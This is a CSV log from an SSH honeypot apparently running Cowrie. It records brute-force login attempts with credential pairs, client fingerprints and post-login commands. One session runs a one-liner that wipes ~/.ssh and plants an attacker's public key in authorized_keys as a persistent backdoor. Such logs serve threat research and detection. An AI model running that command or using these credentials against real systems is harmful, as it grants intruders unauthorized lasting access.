eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.version,140.246.228.50,,,,18da3f35d138,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:00:06.265483Z
cowrie.client.kex,140.246.228.50,,,,18da3f35d138,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:00:06.434175Z
cowrie.login.success,140.246.228.50,,,,18da3f35d138,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T00:00:07.120372Z
cowrie.session.closed,140.246.228.50,,,,18da3f35d138,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:00:07.291494Z
cowrie.session.closed,140.246.228.50,,,,de94cf0c49e2,,,,,Connection lost after 5 seconds,localhost,2024-12-01T00:00:07.300198Z
cowrie.session.connect,117.2.142.24,35710,172.233.154.19,2222,5dc7f86ae4af,ssh,,,,New connection: 117.2.142.24:35710 (172.233.154.19:2222) [session: 5dc7f86ae4af],localhost,2024-12-01T00:01:08.079215Z
cowrie.client.version,117.2.142.24,,,,5dc7f86ae4af,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:01:08.079888Z
cowrie.client.kex,117.2.142.24,,,,5dc7f86ae4af,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:01:08.284919Z
cowrie.login.success,117.2.142.24,,,,5dc7f86ae4af,,,,,login attempt [root/Aa@123456] succeeded,localhost,2024-12-01T00:01:09.140585Z
cowrie.session.params,117.2.142.24,,,,5dc7f86ae4af,,,,,[],localhost,2024-12-01T00:01:09.562144Z
cowrie.command.input,117.2.142.24,,,,5dc7f86ae4af,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T00:01:09.562544Z
cowrie.command.failed,117.2.142.24,,,,5dc7f86ae4af,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T00:01:09.563210Z
cowrie.log.closed,117.2.142.24,,,,5dc7f86ae4af,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T00:01:10.011650Z
cowrie.session.params,117.2.142.24,,,,5dc7f86ae4af,,,,,[],localhost,2024-12-01T00:01:10.232180Z
cowrie.command.input,117.2.142.24,,,,5dc7f86ae4af,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T00:01:10.232598Z
cowrie.session.file_download,117.2.142.24,,,,5dc7f86ae4af,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T00:01:10.437428Z
cowrie.log.closed,117.2.142.24,,,,5dc7f86ae4af,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T00:01:10.437991Z
cowrie.session.connect,117.2.142.24,36476,172.233.154.19,2222,a719086f6ba7,ssh,,,,New connection: 117.2.142.24:36476 (172.233.154.19:2222) [session: a719086f6ba7],localhost,2024-12-01T00:01:10.642245Z
cowrie.client.version,117.2.142.24,,,,a719086f6ba7,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:01:10.643706Z
cowrie.client.kex,117.2.142.24,,,,a719086f6ba7,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:01:10.847089Z
cowrie.login.failed,117.2.142.24,,,,a719086f6ba7,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T00:01:11.664844Z
cowrie.session.closed,117.2.142.24,,,,a719086f6ba7,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:01:12.872639Z
cowrie.session.connect,117.2.142.24,37234,172.233.154.19,2222,af631348a290,ssh,,,,New connection: 117.2.142.24:37234 (172.233.154.19:2222) [session: af631348a290],localhost,2024-12-01T00:01:13.076406Z
cowrie.client.version,117.2.142.24,,,,af631348a290,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:01:13.078161Z
cowrie.client.kex,117.2.142.24,,,,af631348a290,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:01:13.282300Z
cowrie.login.success,117.2.142.24,,,,af631348a290,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T00:01:14.103780Z
cowrie.session.closed,117.2.142.24,,,,5dc7f86ae4af,,,,,Connection lost after 6 seconds,localhost,2024-12-01T00:01:14.309661Z
cowrie.session.closed,117.2.142.24,,,,af631348a290,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:01:14.310853Z
cowrie.session.connect,2.57.122.33,49852,172.233.154.19,2222,24c8c8484dc4,ssh,,,,New connection: 2.57.122.33:49852 (172.233.154.19:2222) [session: 24c8c8484dc4],localhost,2024-12-01T00:01:59.291982Z
cowrie.client.version,2.57.122.33,,,,24c8c8484dc4,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:01:59.292769Z
cowrie.client.kex,2.57.122.33,,,,24c8c8484dc4,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-12-01T00:01:59.473924Z
cowrie.login.failed,2.57.122.33,,,,24c8c8484dc4,,,,,login attempt [www-data/www-data] failed,localhost,2024-12-01T00:02:00.020149Z
cowrie.session.closed,2.57.122.33,,,,24c8c8484dc4,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:02:01.203032Z
cowrie.session.connect,117.2.142.24,33966,172.233.154.19,2222,6318e87c9d21,ssh,,,,New connection: 117.2.142.24:33966 (172.233.154.19:2222) [session: 6318e87c9d21],localhost,2024-12-01T00:02:38.000570Z
cowrie.client.version,117.2.142.24,,,,6318e87c9d21,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:02:38.002220Z
cowrie.client.kex,117.2.142.24,,,,6318e87c9d21,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:02:38.209384Z
cowrie.login.failed,117.2.142.24,,,,6318e87c9d21,,,,,login attempt [helpdesk/123123] failed,localhost,2024-12-01T00:02:39.024880Z
cowrie.session.closed,117.2.142.24,,,,6318e87c9d21,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:02:40.230971Z
cowrie.session.connect,134.209.168.99,50856,172.233.154.19,2222,e17f9412b89c,ssh,,,,New connection: 134.209.168.99:50856 (172.233.154.19:2222) [session: e17f9412b89c],localhost,2024-12-01T00:03:37.057729Z
cowrie.client.version,134.209.168.99,,,,e17f9412b89c,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:03:37.059580Z
cowrie.client.kex,134.209.168.99,,,,e17f9412b89c,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-12-01T00:03:37.163442Z
cowrie.login.success,134.209.168.99,,,,e17f9412b89c,,,,,login attempt [root/123456Qw!] succeeded,localhost,2024-12-01T00:03:37.556843Z
cowrie.session.params,134.209.168.99,,,,e17f9412b89c,,,,,[],localhost,2024-12-01T00:03:37.713391Z
cowrie.command.input,134.209.168.99,,,,e17f9412b89c,,,,,CMD: uname -s -v -n -r -m,localhost,2024-12-01T00:03:37.713737Z
cowrie.log.closed,134.209.168.99,,,,e17f9412b89c,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-12-01T00:03:37.784412Z
cowrie.session.closed,134.209.168.99,,,,e17f9412b89c,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:03:37.785242Z
cowrie.session.connect,117.2.142.24,60200,172.233.154.19,2222,5d4b87e85532,ssh,,,,New connection: 117.2.142.24:60200 (172.233.154.19:2222) [session: 5d4b87e85532],localhost,2024-12-01T00:04:06.625046Z
cowrie.client.version,117.2.142.24,,,,5d4b87e85532,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:04:06.626440Z
cowrie.client.kex,117.2.142.24,,,,5d4b87e85532,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:04:06.827646Z
cowrie.login.failed,117.2.142.24,,,,5d4b87e85532,,,,,login attempt [damilare/damilare] failed,localhost,2024-12-01T00:04:07.639162Z
cowrie.session.closed,117.2.142.24,,,,5d4b87e85532,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:04:08.843336Z
cowrie.session.connect,47.76.115.74,54414,172.233.154.19,2222,4bdedf9f9a8b,ssh,,,,New connection: 47.76.115.74:54414 (172.233.154.19:2222) [session: 4bdedf9f9a8b],localhost,2024-12-01T00:05:10.678190Z
cowrie.session.connect,117.2.142.24,58196,172.233.154.19,2222,c45489a95c4b,ssh,,,,New connection: 117.2.142.24:58196 (172.233.154.19:2222) [session: c45489a95c4b],localhost,2024-12-01T00:05:35.976719Z
cowrie.client.version,117.2.142.24,,,,c45489a95c4b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:05:35.977333Z
cowrie.client.kex,117.2.142.24,,,,c45489a95c4b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:05:36.180478Z
cowrie.login.failed,117.2.142.24,,,,c45489a95c4b,,,,,login attempt [register/register] failed,localhost,2024-12-01T00:05:37.032951Z
cowrie.session.closed,117.2.142.24,,,,c45489a95c4b,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:05:38.239925Z
cowrie.session.closed,47.76.115.74,,,,4bdedf9f9a8b,,,,,Connection lost after 32 seconds,localhost,2024-12-01T00:05:42.843939Z
cowrie.session.connect,47.76.115.74,37004,172.233.154.19,2222,ea2d5feada0c,ssh,,,,New connection: 47.76.115.74:37004 (172.233.154.19:2222) [session: ea2d5feada0c],localhost,2024-12-01T00:05:48.482896Z
cowrie.client.version,47.76.115.74,,,,ea2d5feada0c,,SSH-2.0-libssh_0.7.4,,,Remote SSH version: SSH-2.0-libssh_0.7.4,localhost,2024-12-01T00:05:48.573334Z
cowrie.client.kex,47.76.115.74,,,,ea2d5feada0c,,,e37f354a101aff5871ba233aa82b84ec,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1;aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: e37f354a101aff5871ba233aa82b84ec,localhost,2024-12-01T00:05:48.802043Z
cowrie.session.closed,47.76.115.74,,,,ea2d5feada0c,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:05:49.778663Z
cowrie.session.connect,154.216.19.22,57440,172.233.154.19,2222,ac575fb62c07,ssh,,,,New connection: 154.216.19.22:57440 (172.233.154.19:2222) [session: ac575fb62c07],localhost,2024-12-01T00:06:56.800102Z
cowrie.client.version,154.216.19.22,,,,ac575fb62c07,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:06:56.800756Z
cowrie.client.kex,154.216.19.22,,,,ac575fb62c07,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-12-01T00:06:56.967502Z
cowrie.login.failed,154.216.19.22,,,,ac575fb62c07,,,,,login attempt [jasonwang/123456] failed,localhost,2024-12-01T00:06:57.470880Z
cowrie.session.closed,154.216.19.22,,,,ac575fb62c07,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:06:58.639348Z
cowrie.session.connect,117.2.142.24,56236,172.233.154.19,2222,fc09e2952c2a,ssh,,,,New connection: 117.2.142.24:56236 (172.233.154.19:2222) [session: fc09e2952c2a],localhost,2024-12-01T00:07:06.873100Z
cowrie.client.version,117.2.142.24,,,,fc09e2952c2a,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:06.873776Z
cowrie.client.kex,117.2.142.24,,,,fc09e2952c2a,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:07.077004Z
cowrie.login.failed,117.2.142.24,,,,fc09e2952c2a,,,,,login attempt [alopez/alopez123] failed,localhost,2024-12-01T00:07:07.894366Z
cowrie.session.closed,117.2.142.24,,,,fc09e2952c2a,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:07:09.100495Z
cowrie.session.connect,103.3.247.81,60810,172.233.154.19,2222,74a1da297d75,ssh,,,,New connection: 103.3.247.81:60810 (172.233.154.19:2222) [session: 74a1da297d75],localhost,2024-12-01T00:07:15.496266Z
cowrie.client.version,103.3.247.81,,,,74a1da297d75,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:15.496998Z
